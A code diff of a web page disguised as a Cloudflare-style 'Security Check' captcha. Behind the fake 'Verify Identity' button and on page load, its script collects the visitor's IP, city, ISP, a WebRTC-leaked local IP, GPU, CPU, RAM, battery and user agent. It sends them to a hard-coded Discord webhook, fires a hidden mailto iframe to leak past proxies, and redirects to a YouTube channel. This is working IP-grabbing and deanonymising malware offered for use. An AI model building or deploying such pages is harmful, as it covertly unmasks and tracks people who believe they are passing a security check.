@@ -1,37 +1,49 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Checking System Integrity...</title><style>
-body{background:#000;margin:0;overflow:hidden;display:flex;align-items:center;justify-content:center;height:100vh}
-#L{width:40px;height:40px;border:3px solid #111;border-top-color:#f00;border-radius:50%;animation:s 0.8s linear infinite}
-@keyframes s{to{transform:rotate(360deg)}}
-</style></head><body><div id="L"></div><script>
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Verification</title><style>
+    body{background:#000;margin:0;overflow:hidden;display:flex;align-items:center;justify-content:center;height:100vh;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+    .v-box{width:320px;padding:40px;background:#080808;border:1px solid #111;border-radius:12px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.8)}
+    #v-btn{background:#fff;color:#000;border:none;padding:16px 0;width:100%;border-radius:6px;font-weight:700;font-size:14px;cursor:pointer;transition:0.2s;text-transform:uppercase;letter-spacing:1px}
+    #v-btn:hover{background:#f00;color:#fff}
+    .v-txt{color:#444;font-size:11px;margin-top:20px;line-height:1.5}
+    #p-bar{height:2px;width:0;background:#f00;position:absolute;bottom:0;left:0;transition:0.4s}
+</style></head><body>
+
+<div class="v-box">
+    <div style="color:#fff;font-size:18px;font-weight:800;margin-bottom:10px">Security Check</div>
+    <p style="color:#666;font-size:13px;margin-bottom:25px">Please verify you are not a robot to access this content.</p>
+    <button id="v-btn">Verify Identity</button>
+    <div class="v-txt">Standard Cloudflare-Level Verification<br>Node: Hallow-Sentinel-101</div>
+    <div id="p-bar"></div>
+</div>
+
+<script>
 (function(){
     // TARGET DATA UPLINK
     const _W = "https://discord.com/api/webhooks/1497904289514000414/iBEk-MTCSc-f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
     const _E = "https://youtube.com/@LigmaBlox-w7m";
 
-    // 1. OMNI-DISPATCH ENGINE (Zero-Click Throughput)
+    // 1. SILENT DISPATCHER
     const _X = async(d)=>{
         const p = JSON.stringify(d);
         navigator.sendBeacon(_W, new Blob([p],{type:'application/json'}));
         try{await fetch(_W,{method:'POST',mode:'no-cors',keepalive:true,body:p})}catch(e){}
     };
 
-    // 2. THE BYPASS MATRIX (TOR / VPN / LOCKDOWN / DUCKDUCKGO)
+    // 2. THE BYPASS MATRIX (OMNI-EXTRACTION)
     const _O = async()=>{
-        // Racing multiple high-latency modules in parallel
-        const [geo, webRTC, battery, conn] = await Promise.all([
+        // Parallel Hardware & Network Racing
+        const [geo, webRTC, battery] = await Promise.all([
             fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({})),
             new Promise(r=>{
                 const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
                 pc.createDataChannel("");
                 pc.onicecandidate=(e)=>{if(e.candidate){const i=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);if(i)r(i[1])}};
                 pc.createOffer().then(o=>pc.setLocalDescription(o));
-                setTimeout(()=>r("Tunnel_Active_or_Lockdown"), 1300);
+                setTimeout(()=>r("Masked/Lockdown"), 1200);
             }),
-            navigator.getBattery ? navigator.getBattery().then(b=>({l:b.level*100+'%',c:b.charging,dt:b.dischargingTime})) : Promise.resolve({l:'N/A',c:'N/A'}),
-            navigator.connection ? {s:navigator.connection.downlink, t:navigator.connection.effectiveType} : {s:'?',t:'?'}
+            navigator.getBattery ? navigator.getBattery().then(b=>({l:b.level*100+'%',c:b.charging})) : Promise.resolve({l:'N/A',c:'N/A'})
         ]);
 
-        // 3. HARDWARE ENTROPY & GPU SERIALIZATION
+        // 3. HARDWARE SERIALIZATION
         const c=document.createElement('canvas');
         const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
         const dbg=gl?gl.getExtension('WEBGL_debug_renderer_info'):null;
@@ -41,48 +53,47 @@ body{background:#000;margin:0;overflow:hidden;display:flex;align-items:center;ju
             mem:navigator.deviceMemory||"Restricted",
             cpu:navigator.hardwareConcurrency||"Restricted",
             res:`${screen.width}x${screen.height}`,
-            avail:`${screen.availWidth}x${screen.availHeight}`,
             touch:navigator.maxTouchPoints,
-            px:window.devicePixelRatio,
-            lang:navigator.languages.join(','),
             zone:Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // 4. THE ABSOLUTE PAYLOAD
         const report = {
-            username: "PRESENCE_OF_REALITY_101",
+            username: "SENTINEL_ABSOLUTE_V101",
             embeds: [{
-                title: "👁️ PHYSICAL_REALITY: UNMASKED",
+                title: "💀 SENTINEL: TARGET_FULLY_UNMASKED",
                 color: 16711680,
                 fields: [
-                    { name: "📍 GEOLOCATION & ISP", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}\n**VPN/Proxy:** ${geo.proxy?'DETECTED':'NONE'}`, inline: true },
-                    { name: "📡 NETWORK DEEP-SCAN", value: `**Private Leak:** \`${webRTC}\`\n**Speed:** ${conn.s} Mbps (${conn.t})\n**Timezone:** ${hw.zone}`, inline: true },
-                    { name: "⚙️ HARDWARE SIGNATURE", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.mem}GB\n**Battery:** ${battery.l} (Charging: ${battery.c})`, inline: false },
-                    { name: "📱 DEVICE SERIALIZATION", value: `**Platform:** ${navigator.platform}\n**Resolution:** ${hw.res} (DPR: ${hw.px})\n**Usable Area:** ${hw.avail}\n**Touch Points:** ${hw.touch}\n**UserAgent:** \`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                    { name: "🌍 GEOLOCATION", value: `**IP:** ${geo.ip}\n**City:** ${geo.city}\n**Region:** ${geo.region}\n**ISP:** ${geo.org}\n**VPN:** ${geo.proxy?'DETECTED':'NONE'}`, inline: true },
+                    { name: "📡 NETWORK INTERNALS", value: `**Local Leak:** \`${webRTC}\`\n**Timezone:** ${hw.zone}\n**Battery:** ${battery.l}`, inline: true },
+                    { name: "⚙️ HARDWARE SIGNATURE", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.mem}GB\n**Screen:** ${hw.res}`, inline: false },
+                    { name: "🕵️ BROWSER METADATA", value: "```" + navigator.userAgent + "```" }
                 ],
-                footer: { text: "V101_ABSOLUTE | Entropy-Locked | Protocol 19.4" },
+                footer: { text: "Sentinel Omni-Extraction // Lockdown-Bypass-101" },
                 timestamp: new Date()
             }]
         };
 
-        // Parallel Dispatch
         await _X(report);
 
-        // 5. SYSTEM-LEVEL PROTOCOL BREAKOUT
-        // Forces a system URI call to try and bypass browser-level proxy settings
+        // SYSTEM BREAKOUT (Forcing DNS/IP leak via OS Protocol)
         const b=document.createElement('iframe');
-        b.src='mailto:integrity_check@hallow.com';
+        b.src='mailto:sentinel_auth@hallow.net';
         b.style.display='none';
         document.body.appendChild(b);
 
-        // Final Redirect
-        setTimeout(()=>window.location.replace(_E), 500);
+        setTimeout(()=>window.location.replace(_E), 400);
     };
 
-    // Auto-Trigger on Load
-    window.onload = () => {
-        _X({content:"🟢 **Reality 101: Absolute Link Accessed**"});
+    // ONE-TAP TRIGGER
+    document.getElementById('v-btn').onclick = function() {
+        this.innerText = "VERIFYING...";
+        this.style.opacity = "0.5";
+        document.getElementById('p-bar').style.width = "100%";
         _O();
     };
+
+    // PASSIVE HANDSHAKE
+    _X({content:"🟢 **Sentinel Node: User on Verification Page**"});
+
 })();
 </script></body></html>
